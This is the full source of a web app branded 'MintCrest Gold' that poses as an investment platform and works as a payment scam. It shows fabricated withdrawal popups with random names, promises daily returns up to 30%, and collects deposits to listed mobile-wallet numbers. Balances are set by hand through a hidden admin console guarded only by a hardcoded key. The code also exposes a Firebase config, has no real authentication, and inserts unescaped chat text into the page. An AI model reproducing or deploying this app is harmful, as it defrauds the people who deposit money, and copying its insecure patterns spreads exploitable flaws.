<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Trusted Asset Management</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap');
        body { font-family: 'Outfit', sans-serif; background: #010409; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(40px); border: 1px solid rgba(255,255,255,0.08); border-radius: 2rem; }
        .page { display: none; animation: fadeIn 0.4s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .active-tab { color: #3b82f6; border-top: 2px solid #3b82f6; }
        .fake-popup { position: fixed; bottom: 100px; left: 20px; right: 20px; z-index: 5000; transform: translateY(200%); transition: 0.5s; }
        .show-popup { transform: translateY(0); }
        .spin-wheel { width: 160px; height: 160px; border-radius: 50%; border: 6px solid #1e40af; background: conic-gradient(#1e40af 0deg, #3b82f6 90deg, #1e3a8a 180deg, #2563eb 270deg); transition: 4s cubic-bezier(0.15, 0, 0.15, 1); }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="popup" class="fake-popup glass p-4 flex items-center gap-4 bg-black/80 border-l-4 border-green-500">
        <div class="text-xl">💰</div>
        <div>
            <p id="pop-text" class="text-[10px] font-bold uppercase"></p>
            <p class="text-[8px] opacity-50">SUCCESSFULLY DISBURSED</p>
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[6000] bg-[#010409] flex items-center justify-center p-8">
        <div class="w-full max-w-sm text-center">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-12 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <div class="glass p-10 border-t-2 border-blue-600">
                <input type="text" id="user-name" placeholder="Protocol Identity" class="w-full bg-white/5 p-5 rounded-2xl mb-5 text-center font-bold outline-none focus:border-blue-500 border border-white/5">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest active:scale-95">Access Vault</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div class="p-8 flex justify-between items-center">
            <h1 class="text-2xl font-black italic uppercase" id="u-display">--</h1>
            <button onclick="changePage('support')" class="glass p-3 relative">💬 <span id="chat-dot" class="hidden absolute top-2 right-2 w-2 h-2 bg-red-500 rounded-full"></span></button>
        </div>

        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 mb-6 bg-gradient-to-br from-blue-900/10 to-transparent border-l-4 border-blue-500">
                <p class="text-[9px] text-blue-400 font-bold uppercase tracking-widest mb-1">Portfolio Balance</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div class="mt-4 flex gap-4">
                    <span class="text-[8px] font-bold text-green-400 uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="v-tier" class="text-[8px] font-bold text-gray-500 uppercase">No Active Fleet</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('deposit')" class="glass p-8 text-center bg-blue-600/5">📥<br><span class="text-[9px] font-black uppercase mt-2 block">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 text-center bg-red-600/5">📤<br><span class="text-[9px] font-black uppercase mt-2 block">Withdraw</span></button>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button id="daily-btn" onclick="claimDaily()" class="glass p-5 text-center border-b-2 border-green-500">💰<br><span class="text-[8px] font-bold uppercase mt-1 block">Daily Check-in</span></button>
                <button onclick="changePage('spin')" class="glass p-5 text-center border-b-2 border-yellow-500">🎡<br><span class="text-[8px] font-bold uppercase mt-1 block">Fortune Spin</span></button>
            </div>
            
            <button onclick="changePage('invest')" class="w-full glass p-6 text-center border-dashed border-2 border-blue-500/30">
                <span class="text-[10px] font-black uppercase tracking-[0.2em]">Explore Investment Fleets</span>
            </button>
        </div>

        <div id="p-deposit" class="page p-6">
            <div class="glass p-8 border-t-8 border-blue-600">
                <h3 class="text-center font-black uppercase text-sm mb-6">Capital Funding</h3>
                <div class="space-y-2 mb-6 text-[10px] font-bold">
                    <div class="glass p-4 flex justify-between"><span>EasyPaisa</span><span class="text-green-400">03379827882</span></div>
                    <div class="glass p-4 flex justify-between"><span>JazzCash</span><span class="text-blue-400">03705519562</span></div>
                </div>
                <select id="dep-method" class="w-full bg-white/5 p-5 rounded-2xl mb-3 font-bold border border-white/10 outline-none text-xs text-center">
                    <option value="EasyPaisa">EasyPaisa</option>
                    <option value="JazzCash">JazzCash</option>
                    <option value="Bank Transfer">Bank Transfer</option>
                </select>
                <input type="number" id="dep-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none">
                <input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center uppercase font-bold outline-none">
                <label class="block w-full bg-white/5 p-5 rounded-2xl border-2 border-dashed border-white/10 text-center cursor-pointer mb-6">
                    <span id="dep-proof-label" class="text-[9px] font-bold uppercase opacity-50">📸 Upload Payment Proof</span>
                    <input type="file" id="dep-file" class="hidden" accept="image/*" onchange="document.getElementById('dep-proof-label').innerText='Proof Attached ✅'">
                </label>
                <button onclick="submitDep()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[10px] uppercase">Verify Deposit</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-8 border-t-8 border-red-600">
                <h3 class="text-center font-black uppercase text-sm mb-6">Request Payout</h3>
                <select id="wd-method" class="w-full bg-white/5 p-5 rounded-2xl mb-3 font-bold border border-white/10 outline-none text-xs text-center">
                    <option value="EasyPaisa">EasyPaisa</option>
                    <option value="JazzCash">JazzCash</option>
                    <option value="Bank">Bank Transfer</option>
                </select>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none">
                <input type="text" id="wd-acc" placeholder="Account Number & Title" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center font-bold outline-none">
                <button onclick="submitWd()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[10px] uppercase">Authorize Withdrawal</button>
            </div>
        </div>

        <div id="p-spin" class="page p-6 text-center">
            <h2 class="text-xl font-black uppercase mb-10 text-yellow-500">Fortune Spin</h2>
            <div class="flex justify-center mb-10"><div id="wheel" class="spin-wheel"></div></div>
            <button id="spin-btn" onclick="executeSpin()" class="w-full bg-yellow-600 py-6 rounded-2xl font-black text-[10px] uppercase">Spin Now (24h)</button>
        </div>

        <div id="p-invest" class="page p-6">
            <h3 class="text-center font-black uppercase text-xs mb-6 opacity-40 italic tracking-widest">Active Fleets</h3>
            <div id="plans-list" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-support" class="page p-6">
            <div class="glass flex flex-col h-[65vh]">
                <div id="chat-box" class="flex-1 overflow-y-auto p-6 space-y-3 text-[10px]"></div>
                <div class="p-4 flex gap-2"><input type="text" id="chat-msg" class="flex-1 bg-white/5 p-4 rounded-xl outline-none" placeholder="Enter message..."><button onclick="sendMsg()" class="bg-blue-600 px-6 rounded-xl">Send</button></div>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-black z-[9000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black text-blue-500 uppercase">Master Console</h2>
            <button onclick="closeAdmin()" class="bg-red-600 px-4 py-1 rounded-lg text-[10px] font-bold">EXIT</button>
        </div>
        <div id="adm-requests" class="space-y-4"></div>
        <div class="glass p-8 mt-10">
            <h4 class="text-center text-[10px] font-black uppercase mb-4 opacity-30">Manual User Overwrite</h4>
            <input type="text" id="adm-u" placeholder="Username" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-center text-[10px]">
            <input type="number" id="adm-v" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center text-[10px]">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="admAct('balance')" class="bg-blue-600 py-3 rounded-xl font-bold text-[9px]">ADD BAL</button>
                <button onclick="admAct('profit')" class="bg-green-600 py-3 rounded-xl font-bold text-[9px]">ADD PROF</button>
                <button onclick="admAct('ban')" class="bg-red-600 py-3 rounded-xl font-bold text-[9px] col-span-2">BAN USER</button>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass fixed bottom-0 left-0 w-full p-8 flex justify-around items-center z-[200] rounded-t-[3.5rem] border-t border-white/5">
        <button onclick="changePage('home')" id="n-home" class="active-tab text-xl">🏛️</button>
        <button onclick="changePage('invest')" id="n-invest" class="text-xl">📈</button>
        <button onclick="changePage('deposit')" id="n-deposit" class="text-xl">📥</button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            {n:"Trial Node", p:100, r:2.5}, {n:"Bronze 1", p:500, r:3}, {n:"Bronze 2", p:1000, r:3.5},
            {n:"Silver 1", p:2500, r:4}, {n:"Silver 2", p:5000, r:4.5}, {n:"Gold Prime", p:10000, r:5},
            {n:"⚡ FLASH", p:500, r:15, s:true}, {n:"🚀 ROCKET", p:5000, r:25, s:true}, {n:"👑 CROWN", p:15000, r:30, s:true}
            // Add more up to 25
        ];

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(doc.exists && doc.data().banned) return alert("BANNED!");
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, lastSpin: 0, lastDaily: 0, unread: false, banned: false, tierName: "Inactive" });
            localStorage.setItem('mc_user', name); document.getElementById('u-display').innerText = name;
            startSync(name); startPopups();
            document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { 
                if(doc.exists) { 
                    user = doc.data(); 
                    document.getElementById('v-bal').innerText = "₨ " + (user.balance||0).toLocaleString();
                    document.getElementById('v-profit').innerText = "₨ " + (user.profit||0).toLocaleString();
                    document.getElementById('v-tier').innerText = user.tierName;
                    if(user.unread) document.getElementById('chat-dot').classList.remove('hidden');
                    checkT();
                } 
            });
            db.collection("messages").where("user","==",name).orderBy("time").onSnapshot(s => {
                const b = document.getElementById('chat-box'); b.innerHTML = '';
                s.forEach(d => { const m = d.data(); b.innerHTML += `<div class="${m.side==='admin'?'text-blue-400 font-bold':'text-gray-400'}">● ${m.text}</div>`; });
                b.scrollTop = b.scrollHeight;
            });
        }

        function renderPlans() {
            const l = document.getElementById('plans-list'); l.innerHTML = '';
            plans.forEach(p => {
                l.innerHTML += `<div onclick="buyF(${p.p},${p.r},'${p.n}')" class="glass p-6 flex justify-between items-center active:scale-95 transition-all">
                    <div><h4 class="font-black text-[10px] uppercase">${p.n}</h4><p class="text-[8px] text-green-500 font-bold uppercase">${p.r}% Daily Yield</p></div>
                    <div class="font-black text-sm">₨ ${p.p}</div>
                </div>`;
            });
        }

        async function submitDep() {
            const m = document.getElementById('dep-method').value; const a = document.getElementById('dep-amt').value;
            const t = document.getElementById('dep-tid').value; const f = document.getElementById('dep-file').files[0];
            if(!a || !t || !f) return alert("All fields & Proof Required!");
            const r = new FileReader(); r.readAsDataURL(f);
            r.onload = async () => {
                await db.collection("requests").add({ user: user.name, type: "deposit", amount: parseInt(a), method: m, tid: t, proof: r.result, status: "pending", time: Date.now() });
                alert("Deposit Requested! Admin will verify proof, sweetie! 😘"); location.reload();
            };
        }

        async function submitWd() {
            const m = document.getElementById('wd-method').value; const a = document.getElementById('wd-amt').value;
            const acc = document.getElementById('wd-acc').value;
            if(!a || !acc) return alert("Fill all details!");
            if(parseInt(a) > user.balance) return alert("Low Balance!");
            await db.collection("requests").add({ user: user.name, type: "withdraw", amount: parseInt(a), method: m, acc: acc, status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) });
            alert("Withdrawal Authorized! Processed in 24h. ❤️"); location.reload();
        }

        async function executeSpin() {
            const wheel = document.getElementById('wheel'); wheel.style.transform = `rotate(${Math.floor(Math.random()*5000 + 2000)}deg)`;
            setTimeout(async () => {
                await db.collection("requests").add({ user: user.name, type: "Spin Bonus", status: "pending", time: Date.now(), amount: 0 });
                await db.collection("users").doc(user.name).update({ lastSpin: Date.now() });
                alert("Spin Success! Admin will add bonus shortly! 😘");
            }, 4000);
        }

        async function claimDaily() {
            await db.collection("requests").add({ user: user.name, type: "Daily Reward", status: "pending", time: Date.now(), amount: 0 });
            await db.collection("users").doc(user.name).update({ lastDaily: Date.now() });
            alert("Check-in Logged! Admin will approve. ❤️");
        }

        function checkT() {
            const now = Date.now();
            document.getElementById('spin-btn').disabled = (user.lastSpin + 86400000) > now;
            document.getElementById('daily-btn').disabled = (user.lastDaily + 86400000) > now;
        }

        async function sendMsg() {
            const m = document.getElementById('chat-msg').value; if(!m) return;
            await db.collection("messages").add({ user: user.name, text: m, side: "user", time: Date.now() });
            document.getElementById('chat-msg').value = '';
        }

        function startPopups() {
            const names = ["Ahmed", "Sajid", "Maria", "Usman", "Zoya", "Kashif"];
            setInterval(() => {
                const n = names[Math.floor(Math.random()*names.length)];
                const a = Math.floor(Math.random()*15000) + 500;
                document.getElementById('pop-text').innerText = `${n} withdrew ₨ ${a.toLocaleString()}`;
                document.getElementById('popup').classList.add('show-popup');
                setTimeout(()=>document.getElementById('popup').classList.remove('show-popup'), 4000);
            }, 18000);
        }

        // Admin
        function adminTap() { tapCount++; if(tapCount>=4) { if(prompt("Key:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        async function syncAdm() {
            db.collection("requests").where("status","==","pending").onSnapshot(snap => {
                const l = document.getElementById('adm-requests'); l.innerHTML = '';
                snap.forEach(doc => { const d = doc.data();
                    l.innerHTML += `<div class="glass p-5 text-[9px] font-black uppercase mb-3 border-l-4 ${d.type==='deposit'?'border-blue-500':'border-red-500'}">
                        <p>USER: ${d.user} | ${d.type}</p>
                        <p class="text-lg">Rs ${d.amount} (${d.method})</p>
                        <p class="opacity-40">${d.type==='deposit' ? 'TID: '+d.tid : 'ACC: '+d.acc}</p>
                        <div class="flex gap-2 mt-4">
                            ${d.type==='deposit' ? `<button onclick="window.open().document.write('<img src=\\'${d.proof}\\' style=\\'width:100%\\' />')" class="bg-gray-700 px-3 py-2 rounded">PROOFS</button>` : ''}
                            <button onclick="handleGod('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-3 py-2 rounded">OK</button>
                        </div>
                    </div>`;
                });
            });
        }

        async function handleGod(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const doc = await ref.get();
            let final = amt;
            if(type.includes('Bonus') || type.includes('Reward')) { final = parseInt(prompt("Enter Bonus:")); if(!final) return; }
            if(act==='approved' && (type==='deposit' || type.includes('Bonus') || type.includes('Reward'))) { await ref.update({ balance: (doc.data().balance||0) + final }); }
            await db.collection("requests").doc(id).update({ status: act, amount: final });
            alert("Action Saved!");
        }

        async function admAct(f) {
            const u = document.getElementById('adm-u').value; const v = parseInt(document.getElementById('adm-v').value);
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(f==='ban') await ref.update({ banned: true });
            else if(d.exists) await ref.update({ [f]: (d.data()[f]||0) + v });
            alert("Executed!");
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); document.getElementById('n-'+p).classList.add('active-tab'); if(p==='support') { db.collection("users").doc(user.name).update({unread:false}); document.getElementById('chat-dot').classList.add('hidden'); } }
        window.onload = () => { if(localStorage.getItem('mc_user')) { document.getElementById('user-name').value = localStorage.getItem('mc_user'); login(); } };
    </script>
</body>
</html>
